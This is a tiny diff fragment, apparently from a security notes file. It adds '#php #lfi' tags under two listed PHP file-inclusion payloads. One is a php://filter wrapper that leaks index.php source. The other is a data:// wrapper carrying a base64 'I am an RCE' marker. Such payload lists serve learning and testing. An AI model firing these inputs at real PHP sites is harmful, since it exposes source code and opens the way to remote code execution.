@@ -5,3 +5,4 @@
 - php://filter/convert.base64-encode/resource=index.php
 - data://text/plain;base64,SSBhbSBhbiBSQ0UK==
 
+#php #lfi 
